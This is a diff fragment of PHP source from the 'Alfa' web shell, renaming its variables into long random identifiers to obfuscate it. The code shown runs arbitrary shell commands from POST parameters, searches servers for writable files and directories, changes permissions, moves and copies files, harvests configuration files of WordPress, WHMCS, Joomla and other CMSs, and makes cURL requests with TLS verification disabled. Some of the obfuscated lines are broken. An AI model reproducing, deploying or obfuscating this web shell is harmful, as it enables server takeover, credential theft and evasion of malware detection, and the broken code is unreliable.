+foreach ($ijcmoisj6fb69e88996e72e8fc50e13f205ca4fd as $ofvepnxk736007832d2167baaae763fd3a3f3cf1) {
+if(!@is_readable($ofvepnxk736007832d2167baaae763fd3a3f3cf1)||@is_link($ofvepnxk736007832d2167baaae763fd3a3f3cf1)) continue;
+@Alfa_Searcher($ofvepnxk736007832d2167baaae763fd3a3f3cf1, $uzehrcsaabf77184f55403d75b9d51d79162a7ca, $qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce);
 }
-switch($method){
+switch($qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce){
 case "files":
-foreach ($globFiles as $file){
-if(@is_writable($file)){
-echo "$file<br>";
+foreach ($ghevmcuze3c14af3892a4ccb759e0e4974df197c as $wdyhqgwg8c7dd922ad47494fc02c388e12c00eac){
+if(@is_writable($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac)){
+echo "$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac<br>";
 }
 }
 break;
 case "dirs":
-foreach ($globFiles as $file){
-if(@is_writable(dirname($file)) && !in_array(dirname($file), $blacklist)){
-echo dirname($file).'<br>';
-$blacklist[] = dirname($file);
+foreach ($ghevmcuze3c14af3892a4ccb759e0e4974df197c as $wdyhqgwg8c7dd922ad47494fc02c388e12c00eac){
+if(@is_writable(dirname($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac)) && !in_array(dirname($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac), $vefebpqna0bc9791616492b14e330a7e0ef35512)){
+echo dirname($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac).'<br>';
+$vefebpqna0bc9791616492b14e330a7e0ef35512[] = dirname($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac);
 }
 }
 break;
 case "all":
-foreach ($globFiles as $file){
-echo $file.'<br>';
+foreach ($ghevmcuze3c14af3892a4ccb759e0e4974df197c as $wdyhqgwg8c7dd922ad47494fc02c388e12c00eac){
+echo $wdyhqgwg8c7dd922ad47494fc02c388e12c00eac.'<br>';
 }
 break;
 }
-unset($blacklist);
+unset($vefebpqna0bc9791616492b14e330a7e0ef35512);
 }
 }
-function AlfaiFrameCreator($f,$width='100%',$height='600px'){
-return('<iframe src="'.__ALFA_DATA_FOLDER__."/".$f.'" width="'.$width.'" height="'.$height.'" frameborder="0"></iframe>');
+function AlfaiFrameCreator($npviloqa8fa14cdd754f91cc6554c9e71929cce7,$krjliyrveaae26a6fb20ed3ef54fb23bfa0b1fcc='100%',$txtdplwpb435e227d5dd201e1768b2bcb2e0aa81='600px'){
+return('<iframe src="'.__ALFA_DATA_FOLDER__."/".$npviloqa8fa14cdd754f91cc6554c9e71929cce7.'" width="'.$krjliyrveaae26a6fb20ed3ef54fb23bfa0b1fcc.'" height="'.$txtdplwpb435e227d5dd201e1768b2bcb2e0aa81.'" frameborder="0"></iframe>');
 }
 class AlfaCURL {
-public $headers;
-public $user_agent;
-public $compression;
-public $cookie_file;
-public $proxy;
-public $path;
-public $ssl = true;
-public $curl_status = true;
-function __construct($cookies=false,$compression='gzip',$proxy=''){
-if(!extension_loaded('curl')){$curl_status = false;return false;}
-$this->headers[] = 'Accept: image/gif, image/x-bitmap, image/jpeg, image/pjpeg';
-$this->headers[] = 'Connection: Keep-Alive';
-$this->headers[] = 'Content-type: application/x-www-form-urlencoded;charset=UTF-8';
-$this->user_agent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36)';
-$this->path = ALFA_TEMPDIR.'/Alfa_cookies.txt';
-$this->compression=$compression;
-$this->proxy=$proxy;
-$this->cookies=$cookies;
-if($this->cookies)$this->cookie($this->path);
+public $afgyqqgg4340fd73e75df7a9d9e45902a59ba3a4;
+public $fkkfyomj83647c700b7d38852412f4f946f00c88;
+public $dhozuljc07f5d2d550d5961d1dd0984fe666a2f6;
+public $frplgryj9cb2b16f003927f1e0c694638b1421f4;
+public $eevdbtrw431387eb7262e1cfc79b125eb8a67c60;
+public $jwzcflrpd6fe1d0be6347b8ef2427fa629c04485;
+public $tmhkvnyqf9d5c16a7f42203f8c195432354a3271 = true;
+public $oijsoqia40f49da408d83a872c3a9266ab69d89c = true;
+function __construct($jxucdtmn55e7dd3016ce4ac57b9a0f56af12f7c2=false,$dhozuljc07f5d2d550d5961d1dd0984fe666a2f6='gzip',$eevdbtrw431387eb7262e1cfc79b125eb8a67c60=''){
+if(!extension_loaded('curl')){$oijsoqia40f49da408d83a872c3a9266ab69d89c = false;return false;}
+$this->$ryiulmjo8887138ae202be73d41689c088a543a5[] = 'Accept: image/gif, image/x-bitmap, image/jpeg, image/pjpeg';
+$this->$ryiulmjo8887138ae202be73d41689c088a543a5[] = 'Connection: Keep-Alive';
+$this->$ryiulmjo8887138ae202be73d41689c088a543a5[] = 'Content-type: application/x-www-form-urlencoded;charset=UTF-8';
+$this->$pwhhxsls5de4de01235495bf056e1b9fc3fad3f3 = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36)';
+$this->$kniieicdb8c1606a1d22fd80528b7afcd82602a9 = ALFA_TEMPDIR.'/Alfa_cookies.txt';
+$this->$dbpitbesf27e33f2e5d8312e8630a58e6fe25fc5=$dhozuljc07f5d2d550d5961d1dd0984fe666a2f6;
+$this->$lztociaya3f222e616de01ad575d2532fd68b591=$eevdbtrw431387eb7262e1cfc79b125eb8a67c60;
+$this->$yiieagkk0f6be6c64e1c8334a141527342d3b917=$jxucdtmn55e7dd3016ce4ac57b9a0f56af12f7c2;
+if($this->$yiieagkk0f6be6c64e1c8334a141527342d3b917)$this->cookie($this->$kniieicdb8c1606a1d22fd80528b7afcd82602a9);
 }
-function cookie($cookie_file) {
-if (_alfa_file_exists($cookie_file,false)) {
-$this->cookie_file=$cookie_file;
+function cookie($frplgryj9cb2b16f003927f1e0c694638b1421f4) {
+if (_alfa_file_exists($frplgryj9cb2b16f003927f1e0c694638b1421f4,false)) {
+$this->$yfwwqwqlddef6064ad24da83167da20bd487aba1=$frplgryj9cb2b16f003927f1e0c694638b1421f4;
 }else{
-@fopen($cookie_file,'w') or die($this->error('The cookie file could not be opened.'));
-$this->cookie_file=$cookie_file;
-@fclose($this->cookie_file);
+@fopen($frplgryj9cb2b16f003927f1e0c694638b1421f4,'w') or die($this->error('The cookie file could not be opened.'));
+$this->$yfwwqwqlddef6064ad24da83167da20bd487aba1=$frplgryj9cb2b16f003927f1e0c694638b1421f4;
+@fclose($this->$yfwwqwqlddef6064ad24da83167da20bd487aba1);
 }
 }
-function Send($url,$method="get",$data=""){
-if(!$this->curl_status){return false;}
-$process = curl_init($url);
-curl_setopt($process, CURLOPT_HTTPHEADER, $this->headers);
-curl_setopt($process, CURLOPT_HEADER, 0);
-curl_setopt($process, CURLOPT_USERAGENT, $this->user_agent);
-curl_setopt($process, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($process, CURLOPT_ENCODING , $this->compression);
-curl_setopt($process, CURLOPT_TIMEOUT, 30);
-if($this->ssl){
-curl_setopt($process, CURLOPT_SSL_VERIFYPEER ,false);
-curl_setopt($process, CURLOPT_SSL_VERIFYHOST,false);
+function Send($fefubzei572d4e421e5e6b9bc11d815e8a027112,$qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce="get",$sfmsaibm8d777f385d3dfec8815d20f7496026dc=""){
+if(!$this->$cdyedswo52a07ca1700795bb808d65d1bb6187a3){return false;}
+$kuiuelsn5075140835d0bc504791c76b04c33d2b = curl_init($fefubzei572d4e421e5e6b9bc11d815e8a027112);
+curl_setopt($kuiuelsn5075140835d0bc504791c76b04c33d2b, CURLOPT_HTTPHEADER, $this->$ryiulmjo8887138ae202be73d41689c088a543a5);
+curl_setopt($kuiuelsn5075140835d0bc504791c76b04c33d2b, CURLOPT_HEADER, 0);
+curl_setopt($kuiuelsn5075140835d0bc504791c76b04c33d2b, CURLOPT_USERAGENT, $this->$pwhhxsls5de4de01235495bf056e1b9fc3fad3f3);
+curl_setopt($kuiuelsn5075140835d0bc504791c76b04c33d2b, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($kuiuelsn5075140835d0bc504791c76b04c33d2b, CURLOPT_ENCODING , $this->$dbpitbesf27e33f2e5d8312e8630a58e6fe25fc5);
+curl_setopt($kuiuelsn5075140835d0bc504791c76b04c33d2b, CURLOPT_TIMEOUT, 30);
+if($this->$dojqcedr54a2bf8c09ace67d3513aaa1aa7aa0f3){
+curl_setopt($kuiuelsn5075140835d0bc504791c76b04c33d2b, CURLOPT_SSL_VERIFYPEER ,false);
+curl_setopt($kuiuelsn5075140835d0bc504791c76b04c33d2b, CURLOPT_SSL_VERIFYHOST,false);
 }
-if($this->cookies){
-curl_setopt($process, CURLOPT_COOKIEFILE, $this->path);
-curl_setopt($process, CURLOPT_COOKIEJAR, $this->path);
+if($this->$yiieagkk0f6be6c64e1c8334a141527342d3b917){
+curl_setopt($kuiuelsn5075140835d0bc504791c76b04c33d2b, CURLOPT_COOKIEFILE, $this->$kniieicdb8c1606a1d22fd80528b7afcd82602a9);
+curl_setopt($kuiuelsn5075140835d0bc504791c76b04c33d2b, CURLOPT_COOKIEJAR, $this->$kniieicdb8c1606a1d22fd80528b7afcd82602a9);
 }
-if($this->proxy){
-curl_setopt($process, CURLOPT_PROXY, $this->proxy);
+if($this->$lztociaya3f222e616de01ad575d2532fd68b591){
+curl_setopt($kuiuelsn5075140835d0bc504791c76b04c33d2b, CURLOPT_PROXY, $this->$lztociaya3f222e616de01ad575d2532fd68b591);
 }
-if($method=='post'){
-curl_setopt($process, CURLOPT_POSTFIELDS, $data);
-curl_setopt($process, CURLOPT_POST, 1);
-curl_setopt($process, CURLOPT_HTTPHEADER, array('Content-Type: application/x-www-form-urlencoded'));
+if($qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce=='post'){
+curl_setopt($kuiuelsn5075140835d0bc504791c76b04c33d2b, CURLOPT_POSTFIELDS, $sfmsaibm8d777f385d3dfec8815d20f7496026dc);
+curl_setopt($kuiuelsn5075140835d0bc504791c76b04c33d2b, CURLOPT_POST, 1);
+curl_setopt($kuiuelsn5075140835d0bc504791c76b04c33d2b, CURLOPT_HTTPHEADER, array('Content-Type: application/x-www-form-urlencoded'));
 }
-$return = @curl_exec($process);
-curl_close($process);
-return $return;
+$qidcygige70c4df10ef0983b9c8c31bd06b2a2c3 = @curl_exec($kuiuelsn5075140835d0bc504791c76b04c33d2b);
+curl_close($kuiuelsn5075140835d0bc504791c76b04c33d2b);
+return $qidcygige70c4df10ef0983b9c8c31bd06b2a2c3;
 }
-function error($error) {
-echo "<center><div style='width:500px;border: 3px solid #FFEEFF; padding: 3px; background-color: #FFDDFF;font-family: verdana; font-size: 10px'><b>cURL Error</b><br>$error</div></center>";
+function error($kowlomtecb5e100e5a9a3e7f6d1fd97512215282) {
+echo "<center><div style='width:500px;border: 3px solid #FFEEFF; padding: 3px; background-color: #FFDDFF;font-family: verdana; font-size: 10px'><b>cURL Error</b><br>$kowlomtecb5e100e5a9a3e7f6d1fd97512215282</div></center>";
 die;
 }
 }
-function getConfigHtml($cms){
-$content = '';
-$cms_array = array("wp" => "WordPress", "vb" => "vBulletin", "whmcs" => "Whmcs", "joomla" => "Joomla", "phpnuke" => "PHPNuke","phpbb"=>"PHPBB","mybb"=>"MyBB","drupal"=>"Drupal","smf"=>"SMF");
-$content .= "<form class='getconfig' onSubmit='g(\"GetConfig\",null,this.cms.value,this.path.value,this.getAttribute(\"base_id\"));return false;'><div class='txtfont'>Cms: </div> <select name='cms'style='width:100px;'>";
-foreach($cms_array as $key => $val){
-$content .= "<option value='{$key}' ".($key==$cms?'selected=selected':'').">{$val}</option>";
+function getConfigHtml($enqiaukc570d99e4c85914470d914170d1e95144){
+$mveevork9a0364b9e99bb480dd25e1f0284c8555 = '';
+$kkhtyukm56ced8824ba8ceb4e2e946b5bea40a12 = array("wp" => "WordPress", "vb" => "vBulletin", "whmcs" => "Whmcs", "joomla" => "Joomla", "phpnuke" => "PHPNuke","phpbb"=>"PHPBB","mybb"=>"MyBB","drupal"=>"Drupal","smf"=>"SMF");
+$mveevork9a0364b9e99bb480dd25e1f0284c8555 .= "<form class='getconfig' onSubmit='g(\"GetConfig\",null,this.cms.value,this.path.value,this.getAttribute(\"base_id\"));return false;'><div class='txtfont'>Cms: </div> <select name='cms'style='width:100px;'>";
+foreach($kkhtyukm56ced8824ba8ceb4e2e946b5bea40a12 as $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d => $jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf){
+$mveevork9a0364b9e99bb480dd25e1f0284c8555 .= "<option value='{$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d}' ".($ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d==$enqiaukc570d99e4c85914470d914170d1e95144?'selected=selected':'').">{$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf}</option>";
 }
-$content .= "</select> <div class='txtfont'>Path(installed cms/Config): </div> <input type='text' name='path' value='".$_SERVER['DOCUMENT_ROOT']."/' size='30' /> <button class='button'>GetConfig</button>";
-$content .= "</form>";
-return $content;
+$mveevork9a0364b9e99bb480dd25e1f0284c8555 .= "</select> <div class='txtfont'>Path(installed cms/Config): </div> <input type='text' name='path' value='".$_SERVER['DOCUMENT_ROOT']."/' size='30' /> <button class='button'>GetConfig</button>";
+$mveevork9a0364b9e99bb480dd25e1f0284c8555 .= "</form>";
+return $mveevork9a0364b9e99bb480dd25e1f0284c8555;
 }
 if (!function_exists('json_encode')){
-    function json_encode($a=false){
-        if (is_null($a)) return 'null';
-        if ($a === false) return 'false';
-        if ($a === true) return 'true';
-        if (is_scalar($a))
+    function json_encode($gtvtgpki0cc175b9c0f1b6a831c399e269772661=false){
+        if (is_null($gtvtgpki0cc175b9c0f1b6a831c399e269772661)) return 'null';
+        if ($gtvtgpki0cc175b9c0f1b6a831c399e269772661 === false) return 'false';
+        if ($gtvtgpki0cc175b9c0f1b6a831c399e269772661 === true) return 'true';
+        if (is_scalar($gtvtgpki0cc175b9c0f1b6a831c399e269772661))
         {
-            if (is_float($a))
+            if (is_float($gtvtgpki0cc175b9c0f1b6a831c399e269772661))
             {
-                return floatval(str_replace(",", ".", strval($a)));
+                return floatval(str_replace(",", ".", strval($gtvtgpki0cc175b9c0f1b6a831c399e269772661)));
             }
 
-            if (is_string($a))
+            if (is_string($gtvtgpki0cc175b9c0f1b6a831c399e269772661))
             {
-                static $jsonReplaces = array(array("\\", "/", "\n", "\t", "\r", "\b", "\f", '"'), array('\\\\', '\\/', '\\n', '\\t', '\\r', '\\b', '\\f', '\"'));
-                return '"' . str_replace($jsonReplaces[0], $jsonReplaces[1], $a) . '"';
+                static $omtqmfrf3e8d1e57de61ed80d6d24038925533a9 = array(array("\\", "/", "\n", "\t", "\r", "\b", "\f", '"'), array('\\\\', '\\/', '\\n', '\\t', '\\r', '\\b', '\\f', '\"'));
+                return '"' . str_replace($omtqmfrf3e8d1e57de61ed80d6d24038925533a9[0], $omtqmfrf3e8d1e57de61ed80d6d24038925533a9[1], $gtvtgpki0cc175b9c0f1b6a831c399e269772661) . '"';
             }
             else
-            return $a;
+            return $gtvtgpki0cc175b9c0f1b6a831c399e269772661;
         }
-        $isList = true;
-        for ($i = 0, reset($a); $i < count($a); $i++, next($a))
+        $wrpilbknf42df43db20261ef07af483a86fdc030 = true;
+        for ($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 = 0, reset($gtvtgpki0cc175b9c0f1b6a831c399e269772661); $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 < count($gtvtgpki0cc175b9c0f1b6a831c399e269772661); $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741++, next($gtvtgpki0cc175b9c0f1b6a831c399e269772661))
         {
-            if (key($a) !== $i)
+            if (key($gtvtgpki0cc175b9c0f1b6a831c399e269772661) !== $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741)
             {
-                $isList = false;
+                $wrpilbknf42df43db20261ef07af483a86fdc030 = false;
                 break;
             }
         }
-        $result = array();
-        if ($isList)
+        $nmxeqhvab4a88417b3d0170d754c647c30b7216a = array();
+        if ($wrpilbknf42df43db20261ef07af483a86fdc030)
         {
-            foreach ($a as $v) $result[] = json_encode($v);
-            return '[' . join(',', $result) . ']';
+            foreach ($gtvtgpki0cc175b9c0f1b6a831c399e269772661 as $hvlrcxnj9e3669d19b675bd57058fd4664205d2a) $nmxeqhvab4a88417b3d0170d754c647c30b7216a[] = json_encode($hvlrcxnj9e3669d19b675bd57058fd4664205d2a);
+            return '[' . join(',', $nmxeqhvab4a88417b3d0170d754c647c30b7216a) . ']';
         }
         else
         {
-            foreach ($a as $k => $v) $result[] = json_encode($k).':'.json_encode($v);
-            return '{' . join(',', $result) . '}';
+            foreach ($gtvtgpki0cc175b9c0f1b6a831c399e269772661 as $damiszkt8ce4b16b22b58894aa86c421e8759df3 => $hvlrcxnj9e3669d19b675bd57058fd4664205d2a) $nmxeqhvab4a88417b3d0170d754c647c30b7216a[] = json_encode($damiszkt8ce4b16b22b58894aa86c421e8759df3).':'.json_encode($hvlrcxnj9e3669d19b675bd57058fd4664205d2a);
+            return '{' . join(',', $nmxeqhvab4a88417b3d0170d754c647c30b7216a) . '}';
         }
     }
 }
 if ( !function_exists('json_decode') ){
-function json_decode($json, $array=true){
-    $comment = false;
-    $out = '$x=';
-    for ($i=0; $i<strlen($json); $i++)
+function json_decode($enjzynvd466deec76ecdf5fca6d38571f6324d54, $vmwhayoqf1f713c9e000f5d3f280adbd124df4f5=true){
+    $iolthodr06d4cd63bde972fc66a0aed41d2f5c51 = false;
+    $vemvtkqkc68271a63ddbc431c307beb7d2918275 = '$x=';
+    for ($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741=0; $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741<strlen($enjzynvd466deec76ecdf5fca6d38571f6324d54); $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741++)
     {
-        if (!$comment)
+        if (!$iolthodr06d4cd63bde972fc66a0aed41d2f5c51)
         {
-            if ($json[$i] == '{' || $json[$i] == '['){$out .= ' array(';}
-            else if ($json[$i] == '}' || $json[$i] == ']'){$out .= ')';}
-            else if ($json[$i] == ':'){$out .= '=>';}
-            else {$out .= $json[$i];}
+            if ($enjzynvd466deec76ecdf5fca6d38571f6324d54[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741] == '{' || $enjzynvd466deec76ecdf5fca6d38571f6324d54[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741] == '['){$vemvtkqkc68271a63ddbc431c307beb7d2918275 .= ' array(';}
+            else if ($enjzynvd466deec76ecdf5fca6d38571f6324d54[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741] == '}' || $enjzynvd466deec76ecdf5fca6d38571f6324d54[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741] == ']'){$vemvtkqkc68271a63ddbc431c307beb7d2918275 .= ')';}
+            else if ($enjzynvd466deec76ecdf5fca6d38571f6324d54[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741] == ':'){$vemvtkqkc68271a63ddbc431c307beb7d2918275 .= '=>';}
+            else {$vemvtkqkc68271a63ddbc431c307beb7d2918275 .= $enjzynvd466deec76ecdf5fca6d38571f6324d54[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741];}
         }
-        else $out .= $json[$i];
-        if ($json[$i] == '"')    $comment = !$comment;
+        else $vemvtkqkc68271a63ddbc431c307beb7d2918275 .= $enjzynvd466deec76ecdf5fca6d38571f6324d54[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741];
+        if ($enjzynvd466deec76ecdf5fca6d38571f6324d54[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741] == '"')    $iolthodr06d4cd63bde972fc66a0aed41d2f5c51 = !$iolthodr06d4cd63bde972fc66a0aed41d2f5c51;
     }
-    eval($out . ';');
-    return $x;
+    eval($vemvtkqkc68271a63ddbc431c307beb7d2918275 . ';');
+    return $fyyftmba9dd4e461268c8034f5c8564e155c67a6;
 }
 }
 function alfaterminalExec(){
-	$pwd = "pwd";
-	$seperator = ";";
+	$mevhntrj9003d1df22eb4d3820015070385194c8 = "pwd";
+	$pcwmqoeoe72814aaa963a3fa498930dcf0ed40fb = ";";
 	if($GLOBALS['sys']!='unix'){
-		$pwd = "cd";
-		$seperator = "&";
+		$mevhntrj9003d1df22eb4d3820015070385194c8 = "cd";
+		$pcwmqoeoe72814aaa963a3fa498930dcf0ed40fb = "&";
 	}
-	if($GLOBALS["glob_chdir_false"]&&!empty($_POST["c"])){$cmd = "cd '".addslashes($_POST["c"])."'".$seperator;}
-	$current_path = '';
-	if(preg_match("/cd[ ]{0,}(.*)[ ]{0,}".$seperator."|cd[ ]{0,}(.*)[ ]{0,}/i", $_POST['alfa1'], $match)){
-		if(empty($match[1])){
-			$match[1] = $match[2];
+	if($GLOBALS["glob_chdir_false"]&&!empty($_POST["c"])){$rifxvzwwdfff0a7fa1a55c8c1a4966c19f6da452 = "cd '".addslashes($_POST["c"])."'".$pcwmqoeoe72814aaa963a3fa498930dcf0ed40fb;}
+	$ognvvcvxc5527cf904b1ac2e8e83d98e7f294001 = '';
+	if(preg_match("/cd[ ]{0,}(.*)[ ]{0,}".$pcwmqoeoe72814aaa963a3fa498930dcf0ed40fb."|cd[ ]{0,}(.*)[ ]{0,}/i", $_POST['alfa1'], $ppwzlnqze3cc92c14a5e6dd1a7d94b6ff634d7fc)){
+		if(empty($ppwzlnqze3cc92c14a5e6dd1a7d94b6ff634d7fc[1])){
+			$ppwzlnqze3cc92c14a5e6dd1a7d94b6ff634d7fc[1] = $ppwzlnqze3cc92c14a5e6dd1a7d94b6ff634d7fc[2];
 		}
-		$current_path = alfaEx("cd ".addslashes($match[1]).$seperator.$pwd);
-		$current_path = str_replace("\\", "/", $current_path);
+		$ognvvcvxc5527cf904b1ac2e8e83d98e7f294001 = alfaEx("cd ".addslashes($ppwzlnqze3cc92c14a5e6dd1a7d94b6ff634d7fc[1]).$pcwmqoeoe72814aaa963a3fa498930dcf0ed40fb.$mevhntrj9003d1df22eb4d3820015070385194c8);
+		$ognvvcvxc5527cf904b1ac2e8e83d98e7f294001 = str_replace("\\", "/", $ognvvcvxc5527cf904b1ac2e8e83d98e7f294001);
 	}
-	$out = alfaEx($cmd.$_POST['alfa1'], true);
-	$out = htmlspecialchars($out);
-	echo json_encode(array("output" => convertBash($out), "path" => $current_path));
+	$vemvtkqkc68271a63ddbc431c307beb7d2918275 = alfaEx($rifxvzwwdfff0a7fa1a55c8c1a4966c19f6da452.$_POST['alfa1'], true);
+	$vemvtkqkc68271a63ddbc431c307beb7d2918275 = htmlspecialchars($vemvtkqkc68271a63ddbc431c307beb7d2918275);
+	echo json_encode(array("output" => convertBash($vemvtkqkc68271a63ddbc431c307beb7d2918275), "path" => $ognvvcvxc5527cf904b1ac2e8e83d98e7f294001));
 }
-function convertBash($code) {
-    $dictionary = array(
+function convertBash($nndigmblc13367945d5d4c91047b3b50234aa7ab) {
+    $yxcvqxqxabc20d7bde1df257f890e152af2e3470 = array(
         '[01;30m' => '<span style="color:black">',
         '[01;31m' => '<span style="color:red">',
         '[01;32m' => '<span style="color:green">',
@@ -6248,52 +6321,52 @@ function convertBash($code) {
         '[01;37m' => '<span style="color:white">',
         '[0m'   => '</span>'
     );
-    $htmlString = str_replace(array_keys($dictionary), $dictionary, $code);
-    return $htmlString;
+    $nfbgrlwk5734ea6261f125e8c8312dc0e1eb803a = str_replace(array_keys($yxcvqxqxabc20d7bde1df257f890e152af2e3470), $yxcvqxqxabc20d7bde1df257f890e152af2e3470, $nndigmblc13367945d5d4c91047b3b50234aa7ab);
+    return $nfbgrlwk5734ea6261f125e8c8312dc0e1eb803a;
 }
 function alfadoActions(){
-	$chdir_fals = false;
+	$qfbxlugo26d40443ff695aa5ca38b91e8a4b7772 = false;
 	if(!@chdir($_POST['c'])){
-		$chdir_fals = true;
-		$alfa_canruncmd = _alfa_can_runCommand(true,true);
+		$qfbxlugo26d40443ff695aa5ca38b91e8a4b7772 = true;
+		$mzmqxzhpe782b1ecc296da557fbe5edc82e64dd7 = _alfa_can_runCommand(true,true);
 	}
 	if(isset($_POST['alfa1']))$_POST['alfa1'] = rawurldecode($_POST['alfa1']);
 	if(isset($_POST['alfa2']))$_POST['alfa2'] = rawurldecode($_POST['alfa2']);
-	$action = $_POST["alfa3"];
-	if($action == "permission"){
-		$perms = 0;
-		$perm = $_POST["alfa2"];
-		for($i=strlen($perm)-1;$i>=0;--$i){
-			$perms += (int)$perm[$i]*pow(8, (strlen($perm)-$i-1));
+	$psxclsvx418c5509e2171d55b0aee5c2ea4442b5 = $_POST["alfa3"];
+	if($psxclsvx418c5509e2171d55b0aee5c2ea4442b5 == "permission"){
+		$xyksvzrf58f57b98cc8cfb81907179e9b4635762 = 0;
+		$orvpxmpqca659200663cf654dc4410ed494451ee = $_POST["alfa2"];
+		for($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741=strlen($orvpxmpqca659200663cf654dc4410ed494451ee)-1;$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741>=0;--$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741){
+			$xyksvzrf58f57b98cc8cfb81907179e9b4635762 += (int)$orvpxmpqca659200663cf654dc4410ed494451ee[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741]*pow(8, (strlen($orvpxmpqca659200663cf654dc4410ed494451ee)-$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741-1));
 		}
-		if(@chmod($_POST['alfa1'], $perms)){
+		if(@chmod($_POST['alfa1'], $xyksvzrf58f57b98cc8cfb81907179e9b4635762)){
 			echo("done");
 		}else{
 			echo("no");
 		}
 		return;
 	}
-	if($action == "rename" || $action == "move"){
-		$alfa1_decoded = $_POST['alfa1'];
-		if($chdir_fals){
+	if($psxclsvx418c5509e2171d55b0aee5c2ea4442b5 == "rename" || $psxclsvx418c5509e2171d55b0aee5c2ea4442b5 == "move"){
+		$qdtibsqye1811c0c73fb371dc3b92d7bbabfc584 = $_POST['alfa1'];
+		if($qfbxlugo26d40443ff695aa5ca38b91e8a4b7772){
 			$_POST['alfa1'] = $_POST["c"]."/".$_POST["alfa1"];
 		}
 		$_POST['alfa1'] = trim($_POST['alfa1']);
-		$alfa1_escape = addslashes($_POST["alfa1"]);
+		$ykfrrysfb3101d8ff211f7523e7c281757437a55 = addslashes($_POST["alfa1"]);
 		if($_POST["alfa3"] == "rename"){
 			$_POST['alfa2'] = basename($_POST['alfa2']);
 		}
 		if(!empty($_POST['alfa2'])){
-			$cmd_rename = false;
-			if($chdir_fals&&$alfa_canruncmd){
+			$cttyjrbbaca66cb949843e056d7268641b9b74cc = false;
+			if($qfbxlugo26d40443ff695aa5ca38b91e8a4b7772&&$mzmqxzhpe782b1ecc296da557fbe5edc82e64dd7){
 				if(_alfa_is_writable($_POST['alfa1'])){
-					$cmd_rename = true;
-					$alfa1_escape = addslashes($alfa1_decoded);
-					alfaEx("cd '".addslashes($_POST['c'])."';mv '".$alfa1_escape."' '".addslashes($_POST['alfa2'])."'");
+					$cttyjrbbaca66cb949843e056d7268641b9b74cc = true;
+					$ykfrrysfb3101d8ff211f7523e7c281757437a55 = addslashes($qdtibsqye1811c0c73fb371dc3b92d7bbabfc584);
+					alfaEx("cd '".addslashes($_POST['c'])."';mv '".$ykfrrysfb3101d8ff211f7523e7c281757437a55."' '".addslashes($_POST['alfa2'])."'");
 				}
 			}
 			if(!file_exists($_POST['alfa2'])){
-				if(@rename($_POST['alfa1'], $_POST['alfa2'])||$cmd_rename){
+				if(@rename($_POST['alfa1'], $_POST['alfa2'])||$cttyjrbbaca66cb949843e056d7268641b9b74cc){
 					echo "done";
 				}else{
 					echo "no";
@@ -6302,21 +6375,21 @@ function alfadoActions(){
 				echo "no";
 			}
 		}
-	}elseif($action == "copy"){
+	}elseif($psxclsvx418c5509e2171d55b0aee5c2ea4442b5 == "copy"){
 		if(is_dir($_POST["alfa1"])){
-			$dir = str_replace('//', '/', $_POST["alfa1"]);
-			$dir = explode('/', $dir);
-			if(empty($dir[count($dir) - 1])){
-				$name = $dir[count($dir) - 2];
+			$ofvepnxk736007832d2167baaae763fd3a3f3cf1 = str_replace('//', '/', $_POST["alfa1"]);
+			$ofvepnxk736007832d2167baaae763fd3a3f3cf1 = explode('/', $ofvepnxk736007832d2167baaae763fd3a3f3cf1);
+			if(empty($ofvepnxk736007832d2167baaae763fd3a3f3cf1[count($ofvepnxk736007832d2167baaae763fd3a3f3cf1) - 1])){
+				$kkkpgnftb068931cc450442b63f5b3d276ea4297 = $ofvepnxk736007832d2167baaae763fd3a3f3cf1[count($ofvepnxk736007832d2167baaae763fd3a3f3cf1) - 2];
 			}else{
-				$name = $dir[count($dir) - 1];
+				$kkkpgnftb068931cc450442b63f5b3d276ea4297 = $ofvepnxk736007832d2167baaae763fd3a3f3cf1[count($ofvepnxk736007832d2167baaae763fd3a3f3cf1) - 1];
 			}
 		}else{
-			$name = basename($_POST["alfa1"]);
+			$kkkpgnftb068931cc450442b63f5b3d276ea4297 = basename($_POST["alfa1"]);
 		}
-		$dir = dirname($_POST["alfa1"]);
-		if($dir == "."){
-			$dir = $_POST["c"]."/";
+		$ofvepnxk736007832d2167baaae763fd3a3f3cf1 = dirname($_POST["alfa1"]);
+		if($ofvepnxk736007832d2167baaae763fd3a3f3cf1 == "."){
+			$ofvepnxk736007832d2167baaae763fd3a3f3cf1 = $_POST["c"]."/";
 		}
